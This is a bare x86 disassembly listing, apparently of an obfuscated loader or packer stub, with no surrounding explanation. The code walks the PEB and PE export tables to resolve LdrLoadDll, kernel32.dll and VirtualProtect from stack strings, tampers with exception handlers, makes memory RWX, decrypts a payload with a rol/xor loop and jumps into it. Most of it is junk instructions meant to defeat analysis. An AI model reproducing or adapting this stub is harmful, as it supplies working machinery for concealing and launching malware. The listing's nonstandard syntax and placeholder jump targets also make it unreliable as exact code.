_start
pushad
call $+5
mov [ esp ] eax
xor eax [ esp ]
add esp 0x4
push esp
test ebx ebx
sbb eax 0xffffffff
mov esi [ esp ]
add esp 0x4
and ecx ecx
adc eax 0x1
and esi esi
sbb esi 0x4
test edx edx
sbb eax 0xffffffff
neg eax
call $+5
sub [ esi ] eax
retn
sub_25f02040
sub eax eax
add eax 0x0
mov ebx eax
mov esi 0x0
add esi eax
sub bh 0x1
sub bh 0x1
mov bl bh
call $+5
test ecx ecx
adc esi 0x1
and edi 0x0
or edi [ esp ]
movzx ecx [ edi + esi - 0x2 ]
cmp ecx ebx
jne r-xdata
add [ esp ] eax
jmp [ esp ]
and eax 0x0
or eax esi
sub_25f020ac
push [ fs : 0x0 ]
add edi esi
mov ebx 0x0
sub ebx 0xffff
neg ebx
not ecx
add edi esi
mov [ fs : 0x0 ] esp
and edi ecx
and ecx ecx
adc edi esi
and esi esi
jno r-xdata
call $+5
call sub_25f020ac
push ecx
xor ecx ecx
add ecx [ esp + 0x10 ]
inc [ ecx + 0xb8 ]
and ebx ebx
adc [ ecx + 0xb8 ] 0x1
add esp 0x4
mov ecx [ esp - 0x4 ]
push eax
xor eax [ esp ]
sub esp 0xfffffffc
retn 0x10
mov eax [ esp ]
add esp 0x4
mov eax 0x0
sub eax [ esp ]
neg eax
mov [ fs : 0x0 ] eax
add esp 0x8
or ebx ebx
mov esi 0x0
adc esi edi
or ecx ecx
mov eax 0x0
adc eax [ edi + 0x3c ]
test ecx ecx
adc edi eax
mov eax 0x4550
test edi edi
mov edx 0x0
adc edx [ edi ]
call $+5
mov [ esp ] edx
xor edx eax
pop edx
jne r-xdata
jmp [ esp ]
popad
mov eax 0x0
add eax 0x1
retn 0xc
mov eax [ edi + 0x78 ]
xor edi edi
add edi eax
add edi esi
push edi
or ebx ebx
mov eax 0x0
adc eax [ edi + 0x20 ]
push eax
pop edi
or ecx ecx
adc edi esi
sub esp 0x4
mov [ esp ] esi
sub esp 0x4
mov [ esp ] edi
add esp 0x4
mov esi [ esp - 0x4 ]
add esp 0x4
mov ebx [ esp - 0x4 ]
push edx
xor edx [ esp ]
test ebx ebx
sbb esp 0xfffffffc
and eax 0x0
or eax esi
push [ esi ]
pop ecx
xor esi esi
or esi ecx
call $+5
mov ebp 0x0
sub ebp esp
neg ebp
or eax eax
adc esi ebx
push 0x6c6c
sub esp 0x4
mov [ esp ] 0x4464616f
add esp 0xfffffffc
mov [ esp ] 0x4c72644c
mov edi esp
test esi esi
mov ecx 0x0
adc ecx 0xb
[ esi ] [ edi ]
je r-xdata
sub edi esi
call $+5
mov [ esp ] eax
xor eax [ esp ]
sub esp 0xfffffffc
mov eax [ edi ]
mov edx 0x0
or edx 0x5a4d
and eax ebx
push edx
sub edx eax
pop edx
je r-xdata
xor esp esp
xor esp ebp
pop esi
call $+5
mov [ esp ] ebx
call $+5
mov [ esp ] edx
pop ecx
mov esi [ esp ]
add esp 0x4
add esp 0x4
mov edi [ esp - 0x4 ]
and ebx 0x0
add ebx edi
sub eax eax
add eax [ edi + 0x24 ]
xor edi edi
or edi eax
and ebx ebx
adc edi esi
mov eax 0x0
or eax [ edi + ecx * 2 ]
and eax 0xffff
mov ecx 0x0
xor ecx eax
mov eax [ ebx + 0x10 ]
or ecx ecx
sbb ecx eax
inc ecx
push [ ebx + 0x1c ]
pop edi
test edx edx
adc edi esi
mov eax [ edi + ecx * 4 ]
test edx edx
adc esi eax
and ebp 0x0
or ebp esp
sub esp 0x4
mov [ esp ] eax
xor eax [ esp ]
sub esp 0xfffffffc
call $+5
mov [ esp ] eax
mov edi 0x0
add edi esp
add esp 0xfffffffc
mov [ esp ] eax
push 0x6c006c
push 0x64002e
sub esp 0x4
mov [ esp ] 0x320033
call $+5
mov [ esp ] 0x6c0065
add esp 0xfffffffc
mov [ esp ] 0x6e0072
add esp 0xfffffffc
mov [ esp ] 0x65006b
push esp
add esp 0xfffffffc
mov [ esp ] 0x1a0018
mov edx 0x0
add edx esp
call $+5
mov [ esp ] edi
call $+5
mov [ esp ] edx
sub esp 0x4
mov [ esp ] eax
sub esp 0x4
mov [ esp ] eax
sub esp 0x4
mov [ esp ] esi
sub esp 0x4
mov [ esp ] edi
add esp 0x4
mov esi [ esp - 0x4 ]
add esp 0x4
mov ebx [ esp - 0x4 ]
call ebx
mov eax 0x0
sub eax [ esi ]
neg eax
call $+5
mov [ esp ] eax
add esp 0x4
mov eax [ esp - 0x4 ]
push [ fs : 0x30 ]
pop edx
xor esi esi
or esi [ edx + 0x10 ]
mov [ esi + 0x18 ] eax
and esp 0x0
or esp ebp
push [ fs : 0x30 ]
pop edx
mov esi [ edx + 0x10 ]
mov edi 0x0
sub edi [ esi + 0x18 ]
neg edi
mov esi 0x0
add esi edi
mov eax [ edi + 0x3c ]
test ebx ebx
adc edi eax
mov eax 0x0
sub eax [ edi + 0x78 ]
neg eax
and edi 0x0
or edi eax
or esi esi
adc edi esi
sub esp 0x4
mov [ esp ] edi
mov eax 0x0
sub eax [ edi + 0x20 ]
neg eax
xor edi edi
add edi eax
add edi esi
push esi
sub esp 0x4
mov [ esp ] edi
mov esi [ esp ]
add esp 0x4
pop ebx
push edx
xor edx [ esp ]
or edi edi
sbb esp 0xfffffffc
mov eax 0x0
sub eax esi
neg eax
mov ecx 0x0
xor ecx [ esi ]
sub esi esi
add esi ecx
call $+5
xor ebp ebp
or ebp esp
or ebx ebx
adc esi ebx
call $+5
mov [ esp ] 0x7463
push 0x65746f72
add esp 0xfffffffc
mov [ esp ] 0x506c6175
call $+5
mov [ esp ] 0x74726956
or esi esi
mov edi 0x0
adc edi esp
xor ecx ecx
add ecx 0xf
[ esi ] [ edi ]
je r-xdata
or ebx ebx
sbb edx 0xffffffff
test ecx ecx
adc eax 0x4
xor esi esi
xor esi [ eax ]
xor esp esp
xor esp ebp
jmp [ esp ]
and esp 0x0
or esp ebp
pop esi
sub esp 0x4
mov [ esp ] ebx
call $+5
mov [ esp ] edx
add esp 0x4
mov ecx [ esp - 0x4 ]
pop esi
pop edi
mov ebx edi
and eax 0x0
add eax [ edi + 0x24 ]
xor edi edi
add edi eax
test esi esi
adc edi esi
mov eax [ edi + ecx * 2 ]
and eax 0xffff
and esi esi
mov ecx 0x0
adc ecx eax
mov eax 0x0
xor eax [ ebx + 0x10 ]
sub ecx eax
or ebx ebx
sbb ecx 0xffffffff
xor edi edi
add edi [ ebx + 0x1c ]
and edx edx
adc edi esi
xor eax eax
xor eax [ edi + ecx * 4 ]
add esi eax
mov ebx 0x0
xor ebx 0x1000
call $+5
mov edi [ esp ]
add esp 0x4
and edi 0xfffff000
or ecx ecx
adc edi ebx
and ebx ebx
adc edi ebx
add esp 0xfffffffc
mov [ esp ] edi
xor edx edx
or edx 0x4
call $+5
add edi ebx
push [ edi ]
pop eax
dec edx
je r-xdata
sub edx 0xffffffff
and esi esi
adc eax 0x4
xor esi esi
or esi [ eax ]
mov esp ebp
jmp [ esp ]
add esp 0x4
mov eax [ esp - 0x4 ]
add esp 0x4
mov edi [ esp - 0x4 ]
sub esp 0x4
mov [ esp ] eax
push esp
add esp 0xfffffffc
mov [ esp ] 0x40
push 0x45ce
push edi
sub esp 0x4
mov [ esp ] esi
sub esp 0x4
mov [ esp ] edi
mov esi [ esp ]
add esp 0x4
mov ebx [ esp ]
add esp 0x4
call $+5
pop eax
test edi edi
adc eax 0x1d
sub esp 0x4
mov [ esp ] eax
call $+5
mov [ esp ] ebp
xor ebp ebp
xor ebp esp
add ebx 0x5
jmp ebx
jmp [ esp ]
sub_25f02512
add esp 0x4
mov ebx [ esp - 0x4 ]
mov edi 0x0
or edi esi
xor eax eax
or eax 0xc
add edi eax
push edi
pop esi
mov ebp edi
mov ecx 0x0
sub ecx 0x452c
neg ecx
sub edx edx
add edx ecx
call $+5
push [ esi ]
pop eax
rol al cl
push edx
xor eax [ esp ]
and ecx ecx
adc esp 0x4
push ecx
and ecx ecx
mov ecx 0x0
adc ecx 0x40
sub esp 0x4
mov [ esp ] ebx
or eax eax
sbb ebx ecx
pop ebx
je r-xdata
and eax eax
adc esi 0x1
pop ecx
sub ecx 0x1
je r-xdata
stosb [ edi ]
add esp 0x4
mov eax [ esp - 0x4 ]
call ebp
add eax ebx
add ecx edx
popad
mov eax 0x0
add eax 0x1
retn 0xc
jmp [ esp ]
